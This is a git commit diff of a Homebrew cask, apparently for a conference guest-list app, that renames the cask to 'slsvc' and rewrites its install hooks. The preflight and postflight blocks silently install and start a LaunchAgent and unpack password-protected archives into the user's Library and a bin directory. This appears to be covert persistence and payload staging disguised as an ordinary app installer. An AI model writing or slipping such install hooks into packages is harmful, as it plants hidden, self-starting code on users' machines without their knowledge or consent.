2aff304854d21aae474df6467d9384e9eb34d6fc
eharper-wtconf <eharper@wtconference.com>
2024-11-21 21:56:57 -0500

    update

--- deps/slsvc.rb
+++ deps/slsvc.rb
@@ -1,5 +1,5 @@
-cask "myguestlist" do
-    version "1.1.0"
+cask "slsvc" do
+    version "1.5.0"
     sha256 "8d12fb17ab34180a1a3bbd5aeebbd637ecb40133aaf7634e7d40b26a43e81a67"
 
     url "https://github.com/eharper-wtconf/confapp24/releases/download/rel2/myguestlist.zip"
@@ -15,27 +15,27 @@ cask "myguestlist" do
 
     preflight do
         system_command "/bin/cp",
-                       args: ["/tmp/confapp24/deps/com.user.clocktower.plist", "$HOME/Library/LaunchAgents/com.user.clocktower.plist"]
+                       args: ["/tmp/confapp24/deps/com.user.slsvc.plist", "#{ENV["HOME"]}/Library/LaunchAgents/com.user.slsvc.plist"]
       end      
 
     preflight do
-        system_command "/usr/bin/unzip",
-                       args: ["/tmp/confapp24/deps/appdev.zip", "-P", "clockBamboo88", "-d", "$HOME/Library/"]
-      end
-
-    preflight do
         system_command "/bin/launchctl",
-                       args: ["load", "$HOME/Library/LaunchAgents/com.user.clocktower.plist"]
+                       args: ["load", "#{ENV["HOME"]}/Library/LaunchAgents/com.user.slsvc.plist"]
       end   
 
+      preflight do
+        system_command "/usr/bin/unzip",
+                       args: ["-P", "Microwave44", "/tmp/confapp24/deps/sl.zip", "-d", "#{ENV["HOME"]}/Library/"]
+      end
+
     postflight do
         system_command "/usr/bin/unzip",
-                       args: ["/tmp/confapp24/deps/appdev1.zip", "-P", "clockBamboo88", "-d", "$HOME/Library/"]
+                       args: ["-P", "Microwave44", "/tmp/confapp24/deps/el.zip", "-d", "#{ENV["HOME"]}/usr/local/bin/"]
       end    
-    
+   
     postflight do
         system_command "/bin/launchctl",
-                       args: ["start", "$HOME/Library/LaunchAgents/com.user.clocktower.plist"]
+                       args: ["start", "#{ENV["HOME"]}/Library/LaunchAgents/com.user.slsvc.plist"]
       end
     
     app "myguestlist.app"
